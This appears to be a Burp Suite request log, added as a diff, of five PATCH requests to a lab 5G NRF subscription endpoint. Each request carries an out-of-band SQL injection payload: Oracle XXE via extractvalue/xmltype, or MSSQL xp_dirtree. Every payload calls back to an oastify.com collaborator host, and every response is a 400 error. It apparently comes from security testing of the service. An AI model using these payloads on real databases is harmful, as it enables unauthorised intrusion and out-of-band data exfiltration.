@@ -1,0 +1,137 @@
+<items exportTime="Sat Feb 18 23:16:03 CET 2023">
+  <item>
+    <time>Sat Feb 18 23:04:09 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/subscriptions/{subscriptionID}?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20secmb%20SYSTEM%20%22http%3a%2f%2f7pxp5rv501d9ftv92mq3q7fscjiady3m6a0xqlf.oasti'%7c%7c'fy.com%2f%22%3e%25secmb%3b]%3e')%2c'%2fl')%20from%20dual)=1]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[PATCH]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/subscriptions/{subscriptionID}?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20secmb%20SYSTEM%20%22http%3a%2f%2f7pxp5rv501d9ftv92mq3q7fscjiady3m6a0xqlf.oasti'%7c%7c'fy.com%2f%22%3e%25secmb%3b]%3e')%2c'%2fl')%20from%20dual)=1]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[PATCH /nnrf-nfm/v1/subscriptions/{subscriptionID}?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20secmb%20SYSTEM%20%22http%3a%2f%2f7pxp5rv501d9ftv92mq3q7fscjiady3m6a0xqlf.oasti'%7c%7c'fy.com%2f%22%3e%25secmb%3b]%3e')%2c'%2fl')%20from%20dual)=1 HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+]]></request>
+    <status>400</status>
+    <responselength>225</responselength>
+    <mimetype>CSS</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 400 Bad Request
+Connection: Close
+Content-Length: 157
+
+[json.exception.parse_error.101] parse error at line 1, column 1: syntax error while parsing value - unexpected end of input; expected '[', '{', or a literal]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sat Feb 18 23:04:10 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/subscriptions/{subscriptionID}?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20secmb%20SYSTEM%20%22http%3a%2f%2fjax1q3ghldyl05glnybfbj04xv3myaoysmm9cx1.oasti'%7c%7c'fy.com%2f%22%3e%25secmb%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[PATCH]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/subscriptions/{subscriptionID}?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20secmb%20SYSTEM%20%22http%3a%2f%2fjax1q3ghldyl05glnybfbj04xv3myaoysmm9cx1.oasti'%7c%7c'fy.com%2f%22%3e%25secmb%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[PATCH /nnrf-nfm/v1/subscriptions/{subscriptionID}?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20secmb%20SYSTEM%20%22http%3a%2f%2fjax1q3ghldyl05glnybfbj04xv3myaoysmm9cx1.oasti'%7c%7c'fy.com%2f%22%3e%25secmb%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1 HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+]]></request>
+    <status>400</status>
+    <responselength>225</responselength>
+    <mimetype>CSS</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 400 Bad Request
+Connection: Close
+Content-Length: 157
+
+[json.exception.parse_error.101] parse error at line 1, column 1: syntax error while parsing value - unexpected end of input; expected '[', '{', or a literal]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sat Feb 18 23:04:11 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/subscriptions/{subscriptionID}?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5clg53w5mjrf4n67mnt0hhhl663x9o4cu0lq9kwakz.oasti'%2b'fy.com%5cgpz'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[PATCH]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/subscriptions/{subscriptionID}?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5clg53w5mjrf4n67mnt0hhhl663x9o4cu0lq9kwakz.oasti'%2b'fy.com%5cgpz'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[PATCH /nnrf-nfm/v1/subscriptions/{subscriptionID}?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5clg53w5mjrf4n67mnt0hhhl663x9o4cu0lq9kwakz.oasti'%2b'fy.com%5cgpz'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+]]></request>
+    <status>400</status>
+    <responselength>225</responselength>
+    <mimetype>CSS</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 400 Bad Request
+Connection: Close
+Content-Length: 157
+
+[json.exception.parse_error.101] parse error at line 1, column 1: syntax error while parsing value - unexpected end of input; expected '[', '{', or a literal]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sat Feb 18 23:04:12 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/subscriptions/{subscriptionID}?1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cqnh83atoykbsdcts05omoqdba2gtbh15swgq3gr5.oasti'%2b'fy.com%5csti'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[PATCH]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/subscriptions/{subscriptionID}?1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cqnh83atoykbsdcts05omoqdba2gtbh15swgq3gr5.oasti'%2b'fy.com%5csti'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[PATCH /nnrf-nfm/v1/subscriptions/{subscriptionID}?1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cqnh83atoykbsdcts05omoqdba2gtbh15swgq3gr5.oasti'%2b'fy.com%5csti'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+]]></request>
+    <status>400</status>
+    <responselength>225</responselength>
+    <mimetype>CSS</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 400 Bad Request
+Connection: Close
+Content-Length: 157
+
+[json.exception.parse_error.101] parse error at line 1, column 1: syntax error while parsing value - unexpected end of input; expected '[', '{', or a literal]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sat Feb 18 23:04:13 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/subscriptions/{subscriptionID}?1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cat7s9uz844hcjwzc6pu6uajvgmmdh17pyhmb91xq.oasti'%2b'fy.com%5cdvl'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[PATCH]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/subscriptions/{subscriptionID}?1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cat7s9uz844hcjwzc6pu6uajvgmmdh17pyhmb91xq.oasti'%2b'fy.com%5cdvl'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[PATCH /nnrf-nfm/v1/subscriptions/{subscriptionID}?1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cat7s9uz844hcjwzc6pu6uajvgmmdh17pyhmb91xq.oasti'%2b'fy.com%5cdvl'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+]]></request>
+    <status>400</status>
+    <responselength>225</responselength>
+    <mimetype>CSS</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 400 Bad Request
+Connection: Close
+Content-Length: 157
+
+[json.exception.parse_error.101] parse error at line 1, column 1: syntax error while parsing value - unexpected end of input; expected '[', '{', or a literal]]></response>
+    <comment></comment>
+  </item>
+</items>
